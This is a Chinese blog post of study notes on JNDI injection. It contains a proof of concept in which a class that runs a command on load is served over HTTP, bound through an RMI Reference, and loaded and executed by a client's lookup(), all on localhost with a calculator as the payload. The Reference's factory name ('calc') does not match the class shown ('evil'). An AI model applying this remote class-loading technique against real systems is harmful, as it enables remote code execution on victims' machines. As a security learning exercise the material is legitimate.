---
title: jndi注入学习
date: 2022-05-04 20:43:07
tags:
      - jndi
      - java
categories: java
---

### JNDI简介

JNDI（The Java Naming and Directory Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。

常见的命名/目录提供者

- RMI
- LDAP
- CORBA
- DNS

一个简单的例子开始JNDI的学习

首先编写并编译恶意class文件放到可访问的URL上,接着将其URL注册并绑定给该服务器某端口的RMI服务商

> 这里有个问题,为什么不直接使用RMI来加载恶意类呢

因为RMI它的特点是调用完结果是由RMI服务器去执行的,执行完的结果以序列化的形式传递给客户端,虽然可能存在反序列化的利用,但是不符合这里想要构造的远程加载恶意class文件并在客户端上面执行的思路

恶意类

```java
import java.io.IOException;
public class evil {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();  
        }
    }
}
```

server.java

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class Server {
    public static void main(String[] args) throws Exception{
        //第一个参数随便填
        Reference reference=new Reference("calc","calc","http://127.0.0.1:5555/");
        //这里末尾要加个/,否则无法读取.....
        //将该reference封装成远程对象
        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
        LocateRegistry.createRegistry(1099);
        Naming.bind("hello",referenceWrapper);
    }
}

```

client.java

```java
import javax.naming.Context;
import javax.naming.InitialContext;

public class client {
    public static void main(String[] args)throws Exception {
        String url="rmi://127.0.0.1:1099/hello";
        Context ctx=new InitialContext();
        ctx.lookup(url);
    }
}
```

最后本质上是通过URLClassLoader去远程加载了恶意类
